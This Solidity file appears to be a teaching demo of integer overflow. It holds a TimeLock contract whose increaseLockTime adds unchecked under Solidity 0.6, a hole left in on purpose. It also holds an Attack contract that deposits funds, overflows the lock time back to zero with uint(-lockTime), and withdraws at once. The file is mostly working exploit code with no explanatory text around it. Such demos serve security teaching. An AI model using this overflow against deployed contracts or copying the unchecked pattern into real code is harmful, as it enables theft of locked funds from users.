// SPDX-License-Identifier: MIT

pragma solidity ^0.6.10;

contract TimeLock{

    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable{
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "No balance");
        require(lockTime[msg.sender] <= block.timestamp, "Time locked");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent,) = msg.sender.call{value: amount}("");
        require(sent, "Transfer failed");
    }
}

contract Attack{

    TimeLock public timeLock;
    address public owner;

    constructor(address _target) public{

        timeLock = TimeLock(_target);
        owner = msg.sender;
    }

    function attack() public payable{

        timeLock.deposit{value: msg.value}();

        timeLock.increaseLockTime(
            uint(-timeLock.lockTime(address(this)))
        );

        timeLock.withdraw();
    }

    function withdraw() public{

        require(msg.sender == owner);
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");

        require(sent, "Withdrawal failed");
    }

    fallback() external payable{}

}

